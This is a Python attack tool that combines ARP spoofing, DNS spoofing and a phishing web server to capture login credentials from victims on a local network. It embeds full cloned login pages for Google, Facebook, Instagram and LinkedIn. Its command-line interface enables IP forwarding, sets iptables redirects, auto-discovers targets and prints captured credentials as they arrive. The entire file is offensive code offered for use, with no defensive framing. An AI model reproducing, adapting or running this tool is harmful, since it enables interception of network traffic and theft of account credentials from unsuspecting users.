#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║         Phishing + MITM - Complete Credential Capture           ║
║  Combines: ARP Spoof + DNS Spoof + Phishing Page Server        ║
║  Redirects victim to fake login page, captures credentials     ║
╚══════════════════════════════════════════════════════════════════╝

Quick Start:
  python3 phish_with_mitm.py --auto -i eth0 --site google
  python3 phish_with_mitm.py -t 192.168.1.5 -g 192.168.1.1 -i wlan0 --site facebook
"""

import json
import os
import sys
import time
import signal
import threading
import re
from datetime import datetime

# Try importing the main agent
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

# Color
class C: RED="\033[91m"; GREEN="\033[92m"; YELLOW="\033[93m"; CYAN="\033[96m"; MAGENTA="\033[95m"; WHITE="\033[97m"; RESET="\033[0m"
class S: RESET_ALL="\033[0m"


# ──────────────────────────────────────────────
# PHISHING PAGES DATABASE
# ──────────────────────────────────────────────
PHISHING_PAGES = {
    "google": {
        "title": "Google Sign-In",
        "page": """<!DOCTYPE html><html><head><title>Google Sign-In</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Google Sans',Arial,sans-serif}
body{display:flex;justify-content:center;align-items:center;min-height:100vh;background:#fff}
.card{width:100%;max-width:450px;padding:48px 40px 36px;border:1px solid #dadce0;border-radius:8px;margin:20px}
.logo{display:flex;justify-content:center;margin-bottom:16px}
.logo svg{width:75px;height:24px}
h2{text-align:center;font-size:24px;font-weight:400;color:#202124;margin-bottom:0}
p{text-align:center;font-size:16px;color:#5f6368;margin:8px 0 32px}
.input-group{position:relative;margin-bottom:24px}
.input-group input{width:100%;padding:13px 15px;font-size:16px;border:1px solid #dadce0;border-radius:4px;outline:none;transition:border-color 0.2s}
.input-group input:focus{border-color:#1a73e8;border-width:2px}
.input-group label{position:absolute;left:15px;top:12px;color:#5f6368;font-size:16px;transition:all 0.2s;pointer-events:none;background:white;padding:0 4px}
.input-group input:focus+label,.input-group input:not(:placeholder-shown)+label{top:-8px;font-size:12px;color:#1a73e8}
.info{font-size:14px;color:#5f6368;margin-bottom:32px}
.actions{display:flex;justify-content:space-between;align-items:center}
.actions a{color:#1a73e8;text-decoration:none;font-weight:500;font-size:14px}
.actions button{background:#1a73e8;color:#fff;border:none;padding:8px 24px;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer;height:36px}
.actions button:hover{background:#1765cc}
.error{color:#d93025;font-size:14px;display:none;margin-bottom:16px}
</style></head><body>
<div class="card">
<div class="logo"><svg viewBox="0 0 75 24"><path d="M37.59 7.82v4.56h7.36c-.3 1.67-1.5 3.08-3.24 4.02v3.32h5.26c3.06-2.82 4.82-6.97 4.82-11.9v-.66h-14.2z" fill="#4285F4"/><path d="M14.4 6.04c-1.88 0-3.55.65-4.87 1.72L5.7 4.42C7.53 2.78 10.24 1.5 14.4 1.5c3.16 0 6.02 1.02 8.36 2.76l-3.98 3.1c-.94-.67-2.13-1.32-4.38-1.32z" fill="#EA4335"/><path d="M14.4 14.46c2.26 0 4.02-.74 5.36-2.02l4.7 3.65c-2.4 2.6-5.71 4.28-10.06 4.28-4.54 0-8.62-1.74-11.46-4.6l4.04-3.13c1.24.95 3.38 1.82 5.42 1.82z" fill="#FBBC05"/><path d="M2.94 10.08c-.48.86-.76 1.8-.76 2.82 0 1.02.28 1.96.76 2.82l-4.04 3.13C1.06 16.08 0 13.6 0 10.9c0-2.7 1.06-5.18 2.9-6.95l4.04 3.13z" fill="#34A853"/></svg></div>
<h2>Sign in</h2>
<p>Use your Google Account</p>
<form method="POST" action="/login">
<div class="input-group">
<input type="text" name="email" id="email" placeholder=" " required autofocus>
<label for="email">Email or phone</label>
</div>
<div class="error" id="error-msg">Couldn't find your Google Account</div>
<div class="info">to continue to Gmail</div>
<div class="actions">
<a href="#">Forgot email?</a>
<button type="submit" id="next">Next</button>
</div>
</form>
</div>
<script>document.querySelector('form').addEventListener('submit',function(e){
var email=document.getElementById('email').value;
if(!email||!email.includes('@')){e.preventDefault();
document.getElementById('error-msg').style.display='block';
document.getElementById('email').focus()}})</script>
</body></html>""",
        "description": "Google login page clone"
    },

    "facebook": {
        "title": "Facebook - Log In",
        "page": """<!DOCTYPE html><html><head><title>Facebook - Log In</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:Helvetica,Arial,sans-serif}
body{background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh}
.container{display:flex;flex-wrap:wrap;max-width:980px;width:100%;padding:20px;gap:40px;align-items:center}
.left{flex:1;min-width:300px;padding:20px}
.left h1{color:#1877f2;font-size:56px;font-weight:700;margin-bottom:16px}
.left p{font-size:28px;line-height:1.3;color:#1c1e21}
.right{flex:1;min-width:350px}
.card{background:#fff;border-radius:8px;box-shadow:0 2px 12px rgba(0,0,0,0.1);padding:20px;margin-bottom:16px}
.card form{display:flex;flex-direction:column;gap:12px}
.card input{padding:14px 16px;font-size:17px;border:1px solid #dddfe2;border-radius:6px;outline:none;width:100%}
.card input:focus{border-color:#1877f2;box-shadow:0 0 0 2px #e7f3ff}
.card button[type=submit]{background:#1877f2;color:#fff;border:none;padding:12px;border-radius:6px;font-size:20px;font-weight:700;cursor:pointer}
.card button[type=submit]:hover{background:#166fe5}
.card .divider{border-bottom:1px solid #dadde1;margin:8px 0;text-align:center;position:relative}
.card .divider span{background:#fff;padding:0 16px;color:#606770;font-size:12px;position:relative;top:8px}
.bottom-text{text-align:center;font-size:14px;color:#1c1e21;margin-top:16px}
.bottom-text a{color:#1c1e21;font-weight:700;text-decoration:none}
.bottom-text a:hover{text-decoration:underline}
@media(max-width:700px){.left h1{font-size:32px}.left p{font-size:18px}}
</style></head><body>
<div class="container">
<div class="left">
<h1>facebook</h1>
<p>Facebook helps you connect and share with the people in your life.</p>
</div>
<div class="right">
<div class="card">
<form method="POST" action="/login">
<input type="text" name="email" placeholder="Email address or phone number" required autofocus>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button>
<div class="divider"><span>or</span></div>
<a href="#" style="text-align:center;display:block;color:#1877f2;font-size:15px;text-decoration:none;margin:8px 0">Create new account</a>
</form>
</div>
<div class="bottom-text">
<a href="#">Create a Page</a> for a celebrity, brand or business.
</div>
</div>
</div>
</body></html>""",
        "description": "Facebook login page clone"
    },

    "instagram": {
        "title": "Instagram - Login",
        "page": """<!DOCTYPE html><html><head><title>Instagram</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif}
body{background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh;flex-direction:column}
.container{max-width:350px;width:100%;margin:0 auto}
.login-box{background:#fff;border:1px solid #dbdbdb;border-radius:1px;padding:40px 40px 20px;margin-bottom:10px}
.logo{text-align:center;margin-bottom:24px;font-size:36px;font-weight:200;font-family:'Billabond',cursive}
.logo img{max-width:175px;height:51px}
.logo{font-size:36px;letter-spacing:2px;margin-bottom:20px;font-family:Helvetica}
form{display:flex;flex-direction:column;gap:6px}
input{padding:9px 0 7px 8px;background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;font-size:12px;width:100%;outline:none}
input:focus{border-color:#a8a8a8}
input::placeholder{color:#8e8e8e}
button[type=submit]{background:#0095f6;color:#fff;border:none;border-radius:8px;padding:7px 16px;font-size:14px;font-weight:600;cursor:pointer;margin-top:8px;height:32px}
button[type=submit]:hover{background:#1877f2}
.or-divider{display:flex;align-items:center;margin:16px 0;color:#8e8e8e;font-size:13px}
.or-divider::before,.or-divider::after{content:'';flex:1;border-top:1px solid #dbdbdb}
.or-divider::before{margin-right:18px}
.or-divider::after{margin-left:18px}
.fb-login{text-align:center;margin:8px 0}
.fb-login a{color:#385185;text-decoration:none;font-size:14px;font-weight:600}
.forgot-password{text-align:center;margin-top:12px;font-size:12px}
.forgot-password a{color:#00376b;text-decoration:none}
.signup-box{background:#fff;border:1px solid #dbdbdb;border-radius:1px;padding:20px 40px;text-align:center;font-size:14px;margin-bottom:10px}
.signup-box a{color:#0095f6;text-decoration:none;font-weight:600}
.get-app{text-align:center;font-size:14px;margin:10px 0}
.app-buttons{display:flex;justify-content:center;gap:8px;margin-top:16px}
.app-buttons img{height:40px}
</style></head><body>
<div class="container">
<div class="login-box">
<div class="logo">Instagram</div>
<form method="POST" action="/login">
<input type="text" name="username" placeholder="Phone number, username, or email" required autofocus>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log in</button>
</form>
<div class="or-divider">OR</div>
<div class="fb-login"><a href="#">Log in with Facebook</a></div>
<div class="forgot-password"><a href="#">Forgot password?</a></div>
</div>
<div class="signup-box">
Don't have an account? <a href="#">Sign up</a>
</div>
<div class="get-app">Get the app.</div>
</div>
</body></html>""",
        "description": "Instagram login page clone"
    },

    "linkedin": {
        "title": "LinkedIn - Login",
        "page": """<!DOCTYPE html><html><head><title>LinkedIn: Log In or Sign Up</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,system-ui,BlinkMacSystemFont,'Segoe UI',Roboto,'Helvetica Neue',Fira Sans,Ubuntu,Oxygen,Oxygen-Sans,Cantarell,Droid Sans,'Apple Color Emoji','Segoe UI Emoji','Segoe UI Emoji','Segoe UI Symbol',sans-serif}
body{background:#f3f2ef;display:flex;justify-content:center;align-items:center;min-height:100vh}
.container{width:100%;max-width:400px;padding:20px}
.logo{color:#0a66c2;font-size:32px;font-weight:700;margin-bottom:24px}
.card{background:#fff;border-radius:8px;padding:24px;box-shadow:0 4px 12px rgba(0,0,0,0.08)}
.card h2{font-size:24px;color:#191919;margin-bottom:4px}
.card p{font-size:14px;color:#666;margin-bottom:24px}
form{display:flex;flex-direction:column;gap:16px}
.input-group{position:relative}
.input-group input{width:100%;padding:14px 12px;font-size:16px;border:1px solid #ccc;border-radius:4px;outline:none;transition:border-color 0.2s}
.input-group input:focus{border-color:#0a66c2;border-width:2px}
.input-group label{position:absolute;left:12px;top:14px;color:#666;font-size:16px;transition:all 0.2s;pointer-events:none;background:white;padding:0 4px}
.input-group input:focus+label,.input-group input:not(:placeholder-shown)+label{top:-8px;font-size:12px;color:#0a66c2}
.forgot{text-align:right;margin-top:-8px}
.forgot a{color:#0a66c2;text-decoration:none;font-size:14px;font-weight:600}
.forgot a:hover{text-decoration:underline}
button[type=submit]{background:#0a66c2;color:#fff;border:none;padding:14px;border-radius:28px;font-size:16px;font-weight:600;cursor:pointer;margin-top:8px}
button[type=submit]:hover{background:#004182}
.divider{border-top:1px solid #ccc;margin:8px 0;position:relative}
.join{text-align:center;margin-top:16px;font-size:16px;color:#333}
.join a{color:#0a66c2;text-decoration:none;font-weight:600}
.error{color:#d11124;font-size:13px;display:none;margin:4px 0}
</style></head><body>
<div class="container">
<div class="logo">LinkedIn</div>
<div class="card">
<h2>Sign in</h2>
<p>Stay updated on your professional world</p>
<form method="POST" action="/login">
<div class="input-group">
<input type="text" name="email" id="email" placeholder=" " required autofocus>
<label for="email">Email or phone</label>
</div>
<div class="input-group">
<input type="password" name="password" id="password" placeholder=" " required>
<label for="password">Password</label>
</div>
<div class="forgot"><a href="#">Forgot password?</a></div>
<div class="error" id="error-msg">Please enter a valid email address</div>
<button type="submit">Sign in</button>
</form>
</div>
<div class="join">New to LinkedIn? <a href="#">Join now</a></div>
</div>
</body></html>""",
        "description": "LinkedIn login page clone"
    }
}


def get_page_for_url(url):
    """Auto-detect which page to use based on URL."""
    url_lower = url.lower()
    if "google" in url_lower or "gmail" in url_lower:
        return "google"
    elif "facebook" in url_lower or "fb" in url_lower:
        return "facebook"
    elif "instagram" in url_lower:
        return "instagram"
    elif "linkedin" in url_lower:
        return "linkedin"
    elif "github" in url_lower:
        return "github"
    elif "twitter" in url_lower or "x.com" in url_lower:
        return "twitter"
    return None


def generate_phish_page(platform, custom_page=None):
    """Generate a phishing page HTML for the given platform."""
    if custom_page:
        return custom_page

    if platform in PHISHING_PAGES:
        return PHISHING_PAGES[platform]["page"]
    elif platform in PHISHING_PAGES:
        return PHISHING_PAGES[platform]["page"]
    else:
        # Fallback: generic login
        return PHISHING_PAGES["google"]["page"]


# ──────────────────────────────────────────────
# CLI
# ──────────────────────────────────────────────
def main():
    import argparse

    parser = argparse.ArgumentParser(
        description="Phishing + MITM Credential Capture Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
Examples:
  # Auto MITM + Facebook phishing
  python3 phish_with_mitm.py --auto -i eth0 --site facebook

  # Targeted attack + Google phishing
  python3 phish_with_mitm.py -t 192.168.1.5 -g 192.168.1.1 -i wlan0 --site google

  # Redirect ALL DNS queries to phishing server
  python3 phish_with_mitm.py --auto -i eth0 --site instagram --dns-spoof all

  # With custom page file
  python3 phish_with_mitm.py --auto -i eth0 --page-file /tmp/custom.html

  # List available sites
  python3 phish_with_mitm.py --list-sites

Available sites: {', '.join(PHISHING_PAGES.keys())}
        """
    )

    parser.add_argument("-t", "--target", help="Target IP address")
    parser.add_argument("-g", "--gateway", help="Gateway IP address")
    parser.add_argument("-i", "--interface", help="Network interface", default="eth0")
    parser.add_argument("--auto", action="store_true", help="Auto-discover target & gateway")
    parser.add_argument("--site", help=f"Phishing site to use: {', '.join(PHISHING_PAGES.keys())}")
    parser.add_argument("--page-file", help="Custom HTML file for phishing page")
    parser.add_argument("--dns-spoof", metavar="DOMAINS",
                       help="DNS spoof domains (comma-separated) or 'all'")
    parser.add_argument("--port", type=int, default=8080, help="Phishing server port")
    parser.add_argument("--duration", type=int, help="Attack duration in seconds")
    parser.add_argument("--pcap", action="store_true", help="Save PCAP capture")
    parser.add_argument("--quiet", action="store_true", help="Quiet mode")
    parser.add_argument("--list-sites", action="store_true", help="List available phishing sites")
    parser.add_argument("--no-arp", action="store_true", help="Skip ARP spoofing (just host page)")

    args = parser.parse_args()

    if args.list_sites:
        print(f"\n{C.CYAN}Available phishing sites:{C.RESET}")
        for name, data in PHISHING_PAGES.items():
            print(f"  {C.YELLOW}{name:<15}{C.WHITE}{data['description']}{C.RESET}")
        sys.exit(0)

    # Determine site
    if not args.site:
        warn = f"{C.YELLOW}[!] No --site specified. Using 'google' as default{C.RESET}"
        print(warn)
        args.site = "google"

    # Load custom page if provided
    custom_page = None
    if args.page_file:
        try:
            with open(args.page_file, "r") as f:
                custom_page = f.read()
            print(f"{C.GREEN}[+] Loaded custom page from {args.page_file}{C.RESET}")
        except Exception as e:
            print(f"{C.RED}[-] Failed to load page file: {e}{C.RESET}")
            sys.exit(1)

    # Get page HTML
    page_html = generate_phish_page(args.site, custom_page)

    site_info = PHISHING_PAGES.get(args.site, {"title": "Login", "page": page_html})
    print(f"\n{C.CYAN}╔════════════════════════════════════════════╗{C.RESET}")
    print(f"{C.CYAN}║      Phishing MITM Attack Ready           ║{C.RESET}")
    print(f"{C.CYAN}╚════════════════════════════════════════════╝{C.RESET}")
    print(f"  {C.MAGENTA}Site:{C.WHITE} {args.site.capitalize()} Login Page{C.RESET}")
    print(f"  {C.MAGENTA}Port:{C.WHITE} {args.port}{C.RESET}")
    print()

    # Import and use the main agent
    import mitm_agent as ma

    # Set global variables
    if args.no_arp:
        # Just start phishing server without ARP spoof
        ma.LOG_DIR = "/tmp/mitm_logs"
        ma.RUNNING = True
        os.makedirs(ma.LOG_DIR, exist_ok=True)
        ma.ATTACKER_IP = ma.get_my_ip(args.interface)
        ma.TARGET_IP = args.target or "0.0.0.0"

        # Start phishing server
        ps = ma.PhishingServer(port=args.port)
        ps.load_page("/", page_html)
        ps.start()

        print(f"\n{C.GREEN}[✓] Phishing server running on http://0.0.0.0:{args.port}{C.RESET}")
        print(f"  {C.YELLOW}Victim should visit: http://YOUR_IP:{args.port}/{C.RESET}")
        print(f"  {C.YELLOW}Your IP: {ma.ATTACKER_IP}{C.RESET}")
        print(f"\n  Press Ctrl+C to stop")

        try:
            while ma.RUNNING:
                time.sleep(1)
        except KeyboardInterrupt:
            ma.RUNNING = False
            print(f"\n{C.GREEN}[✓] Stopped{C.RESET}")
        return

    # Full MITM + Phishing
    ma.INTERFACE = args.interface
    ma.stats["start_time"] = datetime.now().isoformat()

    signal.signal(signal.SIGINT, ma.cleanup)
    signal.signal(signal.SIGTERM, ma.cleanup)

    if args.auto:
        ma.auto_discover(args.interface)
    else:
        ma.TARGET_IP = args.target
        ma.GATEWAY_IP = args.gateway
        ma.ATTACKER_IP = ma.get_my_ip(args.interface)
        ma.ATTACKER_MAC = ma.get_my_mac(args.interface)

    if not ma.TARGET_IP or not ma.GATEWAY_IP:
        print(f"{C.RED}[-] Target and gateway required. Use --auto or specify them.{C.RESET}")
        sys.exit(1)

    # Enable IP forwarding
    ma.enable_ip_forwarding()

    # Setup iptables
    ma.setup_iptables(args.interface, ma.TARGET_IP, args.port)

    # Start ARP spoofing
    ma.start_arp_spoof(ma.TARGET_IP, ma.GATEWAY_IP, args.interface)

    # Start packet sniffer
    ma.start_sniffer(args.interface)

    # Start PCAP capture if requested
    if args.pcap:
        ma.start_tcpdump_log(args.interface)

    # Start DNS spoofing
    if args.dns_spoof:
        ds = ma.DNSSpoofer(args.interface)
        if args.dns_spoof == "all":
            ds.add_spoof_all()
        else:
            for domain in args.dns_spoof.split(","):
                ds.add_spoof(domain.strip())
        ds.start()

    # Start phishing server
    ps = ma.PhishingServer(port=args.port)
    ps.load_page("/", page_html)
    ps.start()

    # Stats summary
    print(f"\n{C.GREEN}╔════════════════════════════════════════════╗{C.RESET}")
    print(f"{C.GREEN}║        MITM + PHISHING ACTIVE               ║{C.RESET}")
    print(f"{C.GREEN}╚════════════════════════════════════════════╝{C.RESET}")
    print(f"  {C.MAGENTA}Target:{C.WHITE} {ma.TARGET_IP}{C.RESET}")
    print(f"  {C.MAGENTA}Gateway:{C.WHITE} {ma.GATEWAY_IP}{C.RESET}")
    print(f"  {C.MAGENTA}Phishing URL:{C.WHITE} http://{ma.ATTACKER_IP}:{args.port}/{C.RESET}")
    print(f"  {C.MAGENTA}DNS Spoof:{C.WHITE} {args.dns_spoof or 'disabled'}{C.RESET}")
    print(f"  {C.MAGENTA}Site:{C.WHITE} {args.site.capitalize()}{C.RESET}")
    print(f"\n  {C.YELLOW}Credentials will appear BELOW when submitted!{C.RESET}")
    print(f"  {C.YELLOW}Press Ctrl+C to stop and save report.{C.RESET}")
    print(f"\n  {C.CYAN}Status: {ma.get_live_stats()}{C.RESET}")

    # Live display
    if not args.quiet:
        td = threading.Thread(target=ma.live_display, daemon=True)
        td.start()

    # Run
    try:
        if args.duration:
            time.sleep(args.duration)
        else:
            while ma.RUNNING:
                time.sleep(1)
    except KeyboardInterrupt:
        pass
    finally:
        ma.cleanup()


if __name__ == "__main__":
    main()
